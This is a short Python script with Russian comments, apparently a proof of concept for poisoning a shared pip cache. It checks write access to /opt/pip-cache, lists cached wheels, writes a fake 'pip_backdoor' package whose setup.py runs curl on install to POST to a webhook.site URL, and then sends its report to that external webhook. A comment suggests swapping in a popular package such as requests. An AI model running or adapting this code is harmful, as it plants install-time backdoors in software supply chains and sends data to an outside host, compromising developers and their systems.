import os
import subprocess

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"
CACHE_PATH = "/opt/pip-cache"

def run_cache_poisoning():
    report = []
    
    # 1. Проверяем возможность записи
    test_file = os.path.join(CACHE_PATH, ".health_check")
    try:
        with open(test_file, "w") as f:
            f.write("Lumos was here")
        report.append(f"[+] Write access to {CACHE_PATH} confirmed.")
    except Exception as e:
        report.append(f"[-] No write access to {CACHE_PATH}: {e}")
        return "\n".join(report)

    # 2. Ищем существующие пакеты для подмены
    # Мы ищем .whl файлы или папки с исходниками
    try:
        content = subprocess.getoutput(f"ls -R {CACHE_PATH} | grep .whl | head -n 5")
        report.append(f"[*] Found cached wheels:\n{content}")
    except:
        report.append("[-] Could not list cache content.")

    # 3. PoC: Создаем фейковую зависимость
    # В реальности тут можно подменить популярный пакет (н-р requests)
    poison_dir = os.path.join(CACHE_PATH, "pip_backdoor")
    try:
        if not os.path.exists(poison_dir):
            os.makedirs(poison_dir)
        
        with open(os.path.join(poison_dir, "setup.py"), "w") as f:
            f.write("from setuptools import setup\n")
            f.write("import os\n")
            f.write(f"os.system('curl -X POST -d \"BACKDOOR_EXECUTED_FROM_CACHE\" {WEBHOOK_URL}')\n")
            f.write("setup(name='pip_backdoor', version='0.1')\n")
            
        report.append(f"[!] Created poison package at {poison_dir}")
    except Exception as e:
        report.append(f"[-] Failed to create poison package: {e}")

    return "\n".join(report)

if __name__ == "__main__":
    result = run_cache_poisoning()
    # Отправляем полный отчет на вебхук
    subprocess.run(['curl', '-s', '-X', 'POST', '-d', result, WEBHOOK_URL])
